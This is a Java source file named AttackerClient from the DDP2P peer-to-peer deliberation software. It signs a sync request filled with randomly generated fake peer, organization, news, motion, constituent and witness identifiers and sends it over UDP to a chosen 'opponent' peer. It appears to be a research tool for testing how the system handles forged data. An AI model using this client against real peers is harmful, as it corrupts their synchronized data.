/*   Copyright (C) 2016 Marius C. Silaghi
		Author: Marius Silaghi: msilaghi@fit.edu
		Florida Tech, Human Decision Support Systems Laboratory
       This program is free software; you can redistribute it and/or modify
       it under the terms of the GNU Affero General Public License as published by
       the Free Software Foundation; either the current version of the License, or
       (at your option) any later version.
      This program is distributed in the hope that it will be useful,
      but WITHOUT ANY WARRANTY; without even the implied warranty of
      MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
      GNU General Public License for more details.
      You should have received a copy of the GNU Affero General Public License
      along with this program; if not, write to the Free Software
      Foundation, Inc., 675 Mass Ave, Cambridge, MA 02139, USA.              */
package tools;
import static net.ddp2p.common.util.Util.__;
import java.io.BufferedReader;
import java.io.FileNotFoundException;
import java.io.FileReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.DatagramSocket;
import java.net.InetAddress;
import java.net.InetSocketAddress;
import java.util.ArrayList;
import java.util.Hashtable;
import java.util.Map;
import java.util.Random;
import java.util.Scanner;
import net.ddp2p.common.config.Application;
import net.ddp2p.common.config.DD;
import net.ddp2p.common.config.Identity;
import net.ddp2p.common.data.DDTranslation;
import net.ddp2p.common.data.D_Peer;
import net.ddp2p.common.data.D_PeerInstance;
import net.ddp2p.common.hds.ASNSyncPayload;
import net.ddp2p.common.hds.ASNSyncRequest;
import net.ddp2p.common.hds.Address;
import net.ddp2p.common.hds.Server;
import net.ddp2p.common.hds.StartUp;
import net.ddp2p.common.hds.UDPServer;
import net.ddp2p.common.streaming.RequestData;
import net.ddp2p.common.streaming.SpecificRequest;
import net.ddp2p.common.util.DBInterface;
import net.ddp2p.common.util.GetOpt;
import net.ddp2p.common.util.P2PDDSQLException;
import net.ddp2p.common.util.Util;
import net.ddp2p.widgets.app.MainFrame;
public class AttackerClient{
	private static final boolean DEBUG = true;
	public static void main(String[] args) throws Exception {
		try {
			_main(args);
			} catch (Exception e) {
			       e.printStackTrace();
		}	
	}
	static String dbfile = Application.DEFAULT_DELIBERATION_FILE; 
	static String dbfile1 = Application.DELIBERATION_FILE;
	private static String MyGID;
	private static String MyGIDHash;
	private static String OrgGIDHash;
	private static String OpponentsGID;
	private static String OpponentsGIDHash;
	private static void printUsage() {
		String usage = "Usage: [-p opponentGIDHfile] [-s opponentGIDfile] [-t myGIDfile] [-u myGIDH] [-e orgGIDHfile] -d database";
		System.err.println(usage);
	}
	static boolean parseArgs(String[] args) throws IOException {
		char c;
		while ((c = GetOpt.getopt(args, "t:u:s:p:e:d:")) != GetOpt.END) {
			switch (c) {
			case 't': {
				MyGID = GetOpt.optarg;
			    System.out.println("Input the file name of MyGID text file you want to open");
			    String filename2 = MyGID; 
			    FileReader freader2 = new FileReader(filename2);
			    BufferedReader inputFile2=new BufferedReader(freader2);
			    MyGID = Util.readAll(inputFile2).trim(); 
			    inputFile2.close();
			}
			break;
			case 'd': {
				dbfile = GetOpt.optarg;
				System.out.println("Input the file name of db:"+dbfile);
				break;
			}
			case 'u': {
				MyGIDHash = GetOpt.optarg;
				System.out.println("Input the file name of MyGIDHash text file you want to open");
				String filename3 = MyGIDHash;
				FileReader freader3=new FileReader(filename3);
				BufferedReader inputFile3=new BufferedReader(freader3);
				MyGIDHash = Util.readAll(inputFile3);
				if (MyGIDHash != null) MyGIDHash = MyGIDHash.trim();
				inputFile3.close();
				System.out.println("Input the file name of MyGIDHash text file you want to open "+MyGIDHash);
			}
			break;
			case 'e': {
				OrgGIDHash = GetOpt.optarg;
				System.out.println("Input the file name of the OrgGIDHash text file you want to open ");
			    String filename6 = OrgGIDHash; 
			    FileReader freader6 = new FileReader(filename6);
			    BufferedReader inputFile6 = new BufferedReader(freader6);
			    OrgGIDHash = Util.readAll(inputFile6);
			    OrgGIDHash = OrgGIDHash.trim();
			    inputFile6.close();	    
			}
			break;
			case 's': {
				OpponentsGID = GetOpt.optarg;
				System.out.println("Input the file name of the OpponentsGID text file you want to open");
			    String filename4 = OpponentsGID; 
			    FileReader freader4 = new FileReader(filename4);
			    BufferedReader inputFile4 = new BufferedReader(freader4);
			    OpponentsGID = Util.readAll(inputFile4).trim(); 
			    inputFile4.close();
			}
			break;
			case 'p': {
				OpponentsGIDHash = GetOpt.optarg;
			    System.out.println("Input the file name of the OpponentsGIDHash text file you want to open");
				String filename5 = OpponentsGIDHash; 
			    FileReader freader5 = new FileReader(filename5);
			    BufferedReader inputFile5 = new BufferedReader(freader5);
			    OpponentsGIDHash = Util.readAll(inputFile5).trim(); 
			    inputFile5.close();	
			}
			break;
			case '?':printUsage(); return false;
			default : printUsage(); return false;
			}
		}
		System.out.println("========================");
		System.out.println("MyGID = "+MyGID);
		System.out.println("MyGIDHash = "+MyGIDHash);
		System.out.println("OrgGIDHash = "+OrgGIDHash);
		System.out.println("OpponentsGID = "+OpponentsGID);
		System.out.println("OpponentsGIDHash = "+OpponentsGIDHash);
		System.out.println("========================");
		return true;
	}
	static boolean loadDatabases(ArrayList<String> potentialDatabases) throws P2PDDSQLException {
		boolean DEBUG = true;
		if(DEBUG) System.out.println("loadDatabases: try databases");
		Hashtable<String, String> errors_db = new Hashtable<String, String>();
		for (String attempt : potentialDatabases) {
			if (DEBUG) System.out.println("loadDB:run: try db: "+attempt);
			String error = DD.try_open_database(attempt);
			if (DEBUG && Application.getDB() != null) System.err.println(__("loadDB: main: Got DB = ")+Application.getDB().getName());
			if (error == null ) {			
				if(DEBUG) System.out.println("DD:run: try db success: "+attempt);
				return true;
			}
			errors_db.put(attempt, error);
			if (potentialDatabases.size() > 1) System.err.println(__("Failed attempt to open first choice file:")+" \""+attempt+"\": "+error);
		}
		return false;
	}
	static void initAppFromDB (DBInterface dbInterface) throws P2PDDSQLException {
		Identity.init_Identity(true, true, false); 
		if (DEBUG) System.err.println(__("DD: main: Got Myelf=")+net.ddp2p.common.data.HandlingMyself_Peer.get_myself_or_null());
		StartUp.detect_OS_and_store_in_DD_OS_var();
		StartUp.fill_install_paths_all_OSs_from_DB(); 
		StartUp.switch_install_paths_to_ones_for_current_OS();
		if (DEBUG && Application.getDB() != null) System.err.println(__("initFromDB: main: Got DB = ")+Application.getDB().getName());
		DDTranslation.db = Application.getDB();
		DD.load_listing_directories_noexception();
	}
	static void initApp() {
		net.ddp2p.java.db.Vendor_JDBC_EMAIL_DB.initJDBCEmail();
		DD.startTime = Util.CalendargetInstance();
	}
	public static String randomTimeStamp(){
		int yr = randomNumberRange(2000, 2015);
		String yr1=yr+"";
		
		int mm = randomNumberRange(1, 12);
		String m;
		if (mm <= 9) 
			m = "0" + mm;
		else 
			m = mm + "";
		
		int dd = randomNumberRange(1, 28);
		String d;
		if (dd <= 9) 
			d = "0" + dd;
		else 
			d = dd + "";
		
		int hh = randomNumberRange(0, 23);
		String h;
		if (hh <= 9) 
			h = "0" + hh;
		else 
			h = hh + "";
		
		int mi = randomNumberRange(0, 59);
		String mi1;
		if (mi <= 9) 
			mi1 = "0" + mi;
		else 
			mi1 = mi + "";
		
		int ss = randomNumberRange(0, 59);
		String s;
		if (ss <= 9) 
			s = "0" + ss;
		else
			s = ss + "";
		
		int rn = randomNumberRange(0, 999);
		String rn1;
		if (rn <= 9) 
			rn1 = "00" + rn;
		else if(rn<99&&rn>9)
			rn1 = "0" + rn;
		else
			rn1=rn+"";
		String output=yr1+m+d+h+mi1+s+"."+rn1+"Z";
		return output;
	}

	// function to generate random number 1 to 9
	public static int randomNumber() {
		return randomNumberRange(1, 9);
	}

	// function to generate random alphabet
	public static char randomAlphabet() {
		String alphabet = "abcdefghijklmnopqrstuvwxyz";
		int length = alphabet.length();
		Random random = new Random();
		char output = alphabet.charAt(random.nextInt(length));
		return output;
	}

	// function to generate random number in range
	public static int randomNumberRange(int min, int max) {
		Random random = new Random();
		int randomNum = random.nextInt((max - min) + 1) + min;
		return randomNum;
	}

	// function to generate alphanumeric
	public static String randomAlphaNumberic(String alphabet, int len) {
		int length = alphabet.length();
		Random random = new Random();
		String output = "";
		for (int i = 0; i < len; i++) {
			output += alphabet.charAt(random.nextInt(length));
		}
		return output;
	}

	// function to generate SSH
	public static String randomPeerStringGen() {
		String alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
		int len = 27;
		String gen = randomAlphaNumberic(alphabet, len);
		String output = "P:SHA-1:" + gen + "=";
		return output;
	}
	
	public static String randomMotionStringGen() {
		String alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
		int len = 27;
		String gen = randomAlphaNumberic(alphabet, len);
		String output = "M:SHA-1:" + gen + "=";
		return output;
	}
	
	public static String randomConstituentStringGen() {
		String alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
		int len = 27;
		String gen = randomAlphaNumberic(alphabet, len);
		String output = "R:SHA-1:" + gen + "=";
		return output;
	}
	
	public static String randomWitnessStringGen() {
		String alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
		int len = 27;
		String gen = randomAlphaNumberic(alphabet, len);
		String output = "W:SHA-1:" + gen + "=";
		return output;
	}
	
	public static String randomNewsGlobalStringGen() {
		String alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
		int len = 27;
		String gen = randomAlphaNumberic(alphabet, len);
		String output = "E:SHA-1:" + gen + "=";
		return output;
	}
	
	public static String randomOrganizationStringGen() {
		String alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
		int len = 43;
		String gen = randomAlphaNumberic(alphabet, len);
		String output = "G:" + gen + "=";
		return output;
	}
	
	
	
	public static void _main(String[] args) throws Exception 
	{
		ArrayList<String> potentialDatabases = new ArrayList<String>();
		if (! parseArgs(args)) return;
		initApp();
		if (DD.ONLY_IP4) System.setProperty("java.net.preferIPv4Stack", "true");
		if (DEBUG) System.out.println("User="+Application.USERNAME);
		if (DEBUG) System.out.println("Params: ["+args.length+"]="+Util.concat(args, " ; "));
		potentialDatabases.add(dbfile);
		if (! loadDatabases(potentialDatabases)) {
			if (DEBUG) System.err.println(__("DD: main: Quit no database"));
			return;
		}
		initAppFromDB(Application.getDB());
		DD.startUServer(true, Identity.getCurrentPeerIdentity_QuitOnFailure());
		UDPServer us = Application.getG_UDPServer();
		ASNSyncRequest request = new ASNSyncRequest();
		D_Peer me = net.ddp2p.common.data.HandlingMyself_Peer.get_myself_or_null();
		if (MyGID != null || MyGIDHash != null) {
			me = D_Peer.getPeerByGID_or_GIDhash(MyGID, MyGIDHash,
							true, false, false, null);
			if (me == null) {
				System.out.println("No me! ");
				me =  D_Peer.getPeerByGID_or_GIDhash_NoCreate(MyGID, MyGIDHash, true, false);
				System.out.println("No me 3 "+me);
				System.out.println("No me 3 MyGID="+MyGID);
				if (me != null) System.out.println("No me 3 "+me.getGID());
				return;
			}
		}
		
		
		request.pushChanges = new ASNSyncPayload();	
		request.pushChanges.advertised = new SpecificRequest();		
		//System.out.println(randomTimeStamp());
		//System.out.println(randomStringGen());
		
		RequestData rd = new RequestData();
		
		request.pushChanges.advertised.peers.put(randomPeerStringGen(),randomTimeStamp());	
		request.pushChanges.advertised.news.add(randomNewsGlobalStringGen());
		request.pushChanges.advertised.news.add(randomNewsGlobalStringGen());
		request.pushChanges.advertised.orgs.put(randomOrganizationStringGen(), randomTimeStamp());
		rd.cons.put(randomConstituentStringGen(), randomTimeStamp());
		rd.witn.add(randomWitnessStringGen());
		rd.orgs.add(randomOrganizationStringGen());
		rd.news.add(randomNewsGlobalStringGen());
		rd.moti.add(randomMotionStringGen());
		//rd.tran.add("uvwx");
		//rd.neig.add("yzabcd");
		
		
		rd.global_organization_ID_hash = OrgGIDHash;		
		request.pushChanges.advertised.rd.add(rd);	
		request.address = me;
		request.sign(me.getSK());
		D_Peer dpeer; 
		dpeer = D_Peer.getPeerByGID_or_GIDhash_NoCreate(OpponentsGID, OpponentsGIDHash, true, false);
		if (dpeer == null) {
			System.out.println("No destination ");
			return;
		}
		DatagramSocket clientSocket = new DatagramSocket();		
		for (Address a: dpeer.shared_addresses) {
			System.out.println("address = "+a);
			InetSocketAddress isa = new InetSocketAddress( "127.0.0.1",  45000);
			System.out.println("b: will ship to "+isa);
			us.sendLargeMessage(isa, request.encode(), DD.MTU, OpponentsGID
					, DD.MSGTYPE_SyncRequest);
			System.out.println("c:  end loop "+request);
		}	
		System.out.println("done shared");
		for (D_PeerInstance dpi: dpeer._instances.values()) {
			System.out.println("e");
			for (Address a: dpi.addresses) {
				System.out.println("f");
				if (! Address.SOCKET.equals(a.getPureProtocol())) {
					continue;				
				}
				System.out.println("g");
				InetSocketAddress isa = new InetSocketAddress(a.domain, a.udp_port);
				System.out.println("h");
				us.sendLargeMessage(isa, request.encode(), DD.MTU, OpponentsGID
						, DD.MSGTYPE_SyncRequest);
				System.out.println("i");		
			}
			System.out.println("j");
		}
		System.out.println("k: done instances");
		synchronized(clientSocket) {
			clientSocket.wait(1000*600*600);
			System.out.println("l");
		}
		clientSocket.close();
		System.out.println("m");
		}
	
}

